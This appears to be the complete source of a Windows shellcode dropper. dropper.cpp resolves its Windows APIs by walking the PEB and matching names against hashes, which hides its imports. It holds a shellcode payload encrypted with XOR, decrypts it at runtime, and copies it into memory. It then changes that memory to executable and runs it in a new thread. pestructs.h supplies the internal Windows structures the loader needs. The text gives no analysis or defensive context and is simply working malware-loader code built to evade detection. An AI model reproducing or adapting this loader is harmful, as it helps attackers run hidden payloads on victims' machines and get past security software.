# dropper.cpp
```c
#include "pestructs.h"

constexpr unsigned int hash(const char* string)
{
	unsigned int hash = 0x86735296;
	unsigned int i = 0;
	while (string[i] != 0)
	{
		int tmp = string[i];
		if (tmp >= 65 && tmp <= 92)
		{
			tmp = tmp + 32;
		}
		hash ^= tmp * i;
		hash <<= 1;
		i++;
	}
	return hash;
}

FARPROC WINAPI GetByHash(unsigned int moduleHash, unsigned int functionHash)
{
#ifdef _M_IX86
	PEB* ProcEnvBlk = (PEB*)__readfsdword(0x30);
#else
	PEB* ProcEnvBlk = (PEB*)__readgsqword(0x60);
#endif

	LIST_ENTRY* ModuleList = &ProcEnvBlk->Ldr->InMemoryOrderModuleList;

	for (LIST_ENTRY* pListEntry = ModuleList->Flink; pListEntry != ModuleList; pListEntry = pListEntry->Flink)
	{
		LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

		char result[256]{}; int i = 0; do { result[i] = pEntry->BaseDllName.Buffer[i]; } while (result[i++] != 0);

		if (hash(result) == moduleHash)
		{
			char* pBaseAddr = (char*)(HMODULE)pEntry->DllBase;

			IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pBaseAddr;
			IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)(pBaseAddr + pDosHdr->e_lfanew);
			IMAGE_OPTIONAL_HEADER* pOptionalHdr = &pNTHdr->OptionalHeader;
			IMAGE_DATA_DIRECTORY* pExportDataDir = (IMAGE_DATA_DIRECTORY*)(&pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
			IMAGE_EXPORT_DIRECTORY* pExportDirAddr = (IMAGE_EXPORT_DIRECTORY*)(pBaseAddr + pExportDataDir->VirtualAddress);

			DWORD* pEAT = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfFunctions);
			DWORD* pFuncNameTbl = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfNames);
			WORD* pHintsTbl = (WORD*)(pBaseAddr + pExportDirAddr->AddressOfNameOrdinals);

			void* pProcAddress = NULL;

			for (DWORD i = 0; i < pExportDirAddr->NumberOfNames; i++)
			{
				char* sTmpFuncName = (char*)pBaseAddr + (DWORD_PTR)pFuncNameTbl[i];

				if (hash(sTmpFuncName) == functionHash)
				{
					pProcAddress = (FARPROC)(pBaseAddr + (DWORD_PTR)pEAT[pHintsTbl[i]]);
					break;
				}
			}
			return (FARPROC)pProcAddress;
		}
	}

	return NULL;
}

void XOR(unsigned char* payload, int payloadSize, unsigned char* xorKey, int xorKeySize) {
	for (unsigned int i = 0; i < payloadSize; i++) {
		payload[i] = payload[i] ^ xorKey[i % xorKeySize];
	}
}

#define TOSTRING(X) #X
#define CONCAT(X, Y) X##Y

#define INITDLL(DLL, VAL) constexpr int CONCAT(hash, DLL) = hash(VAL);
#define INITFUNC(FUNC, RETTYPE, ...) constexpr int CONCAT(hash, FUNC) = hash(TOSTRING(FUNC)); using CONCAT(type, FUNC) = RETTYPE(WINAPI*)(__VA_ARGS__);

#define API(DLL, FUNC) ((CONCAT(type, FUNC))GetByHash(CONCAT(hash, DLL), CONCAT(hash, FUNC)))

INITDLL(KERNEL32, "KERNEL32.DLL")
INITDLL(NTDLL, "NTDLL.DLL")

INITFUNC(VirtualAlloc, LPVOID, LPVOID, SIZE_T, DWORD, DWORD);
INITFUNC(RtlMoveMemory, VOID, VOID UNALIGNED*, VOID UNALIGNED*, SIZE_T);
INITFUNC(VirtualProtect, BOOL, LPVOID, SIZE_T, DWORD, PDWORD);
INITFUNC(CreateThread, HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, __drv_aliasesMem LPVOID, DWORD, LPDWORD);
INITFUNC(WaitForSingleObject, DWORD, HANDLE, DWORD);

int main()
{
	unsigned char payload[] = { 
		0xfd,0x6b,0xc6,0x83,0x68,0x9e,0x94,0x32,0x01,0x23,0x04,0x36,0xd9,0x26,0x06,0x63,0x57,0x6b,0x74,0xb5,0xfd,0x3e,0xdf,0x60,0x61,0x6b,0xce,0x35,0x80,0x3e,0xdf,0x60,0x21,0x6b,0xce,0x15,0xc8,0x3e,0x5b,0x85,0x4b,0x69,0x08,0x56,0x51,0x3e,0x65,0xf2,0xad,0x1f,0x24,0x1b,0x9a,0x5a,0x74,0x73,0xc0,0xea,0x48,0x26,0x99,0xb7,0xb6,0xdf,0x53,0x62,0x14,0x2f,0x13,0x24,0x74,0xb9,0x43,0x1f,0x0d,0x66,0x48,0xfd,0xd4,0xba,0x01,0x23,0x45,0x2f,0x1d,0xb6,0x20,0x55,0x49,0x22,0x95,0x37,0x13,0x3e,0x4c,0x76,0x8a,0x63,0x65,0x2e,0x99,0xa6,0xb7,0x64,0x49,0xdc,0x8c,0x26,0x13,0x42,0xdc,0x7a,0x00,0xf5,0x08,0x56,0x51,0x3e,0x65,0xf2,0xad,0x62,0x84,0xae,0x95,0x37,0x55,0xf3,0x39,0xc3,0x30,0x96,0xd4,0x75,0x18,0x16,0x09,0x66,0x7c,0xb6,0xed,0xae,0x0c,0x76,0x8a,0x63,0x61,0x2e,0x99,0xa6,0x32,0x73,0x8a,0x2f,0x0d,0x23,0x13,0x36,0x48,0x7b,0x00,0xf3,0x04,0xec,0x9c,0xfe,0x1c,0x33,0xd1,0x62,0x1d,0x26,0xc0,0x28,0x0d,0x68,0x40,0x7b,0x04,0x3e,0xd9,0x2c,0x1c,0xb1,0xed,0x03,0x04,0x35,0x67,0x96,0x0c,0x73,0x58,0x79,0x0d,0xec,0x8a,0x9f,0x03,0xcd,0xfe,0xdc,0x18,0x2f,0x22,0x77,0x54,0x32,0x01,0x23,0x45,0x67,0x98,0x3e,0xd9,0xbf,0x00,0x22,0x45,0x67,0xd9,0xcc,0x65,0xb9,0x6e,0xa4,0xba,0xb2,0x23,0x96,0x49,0x18,0x0b,0x62,0xff,0xc1,0x0d,0xcb,0xc9,0xcd,0xd4,0x6b,0xc6,0xa3,0xb0,0x4a,0x52,0x4e,0x0b,0xa3,0xbe,0x87,0xed,0x73,0xef,0x75,0x12,0x51,0x2a,0x0d,0x98,0x2f,0x15,0xbb,0xdb,0xdc,0x90,0x04,0xf9,0x1a,0x37,0x1c,0x64,0x5b,0x20,0x67
	};
	unsigned char xorKey[] = {
		0x01, 0x23, 0x45, 0x67, 0x98, 0x76, 0x54, 0x32
	};
	int payloadSize = sizeof(payload);
	int xorKeySize = sizeof(xorKey);

	XOR(payload, payloadSize, xorKey, xorKeySize);

	void* allocatedMemory = API(KERNEL32, VirtualAlloc)(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	API(NTDLL, RtlMoveMemory)(allocatedMemory, payload, payloadSize);

	DWORD oldProtect = 0;
	API(KERNEL32, VirtualProtect)(allocatedMemory, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

	HANDLE thread = API(KERNEL32, CreateThread)(0, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, 0, 0, 0);

	API(KERNEL32, WaitForSingleObject)(thread, INFINITE);

	return 0;
}
```

# pestructs.h
```c
#pragma once

#include <windows.h>

//https://processhacker.sourceforge.io/doc/ntpsapi_8h_source.html#l00063
struct PEB_LDR_DATA
{
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	BOOLEAN ShutdownInProgress;
	HANDLE ShutdownThreadId;
};
//https://processhacker.sourceforge.io/doc/ntpebteb_8h_source.html#l00008
struct PEB
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN IsPackagedProcess : 1;
			BOOLEAN IsAppContainer : 1;
			BOOLEAN IsProtectedProcessLight : 1;
			BOOLEAN SpareBits : 1;
		};
	};
	HANDLE Mutant;
	PVOID ImageBaseAddress;
	PEB_LDR_DATA* Ldr;
	//...
};

struct UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWCH Buffer;
};

//https://processhacker.sourceforge.io/doc/ntldr_8h_source.html#l00102
struct LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	union
	{
		LIST_ENTRY InInitializationOrderLinks;
		LIST_ENTRY InProgressLinks;
	};
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	//...
};
```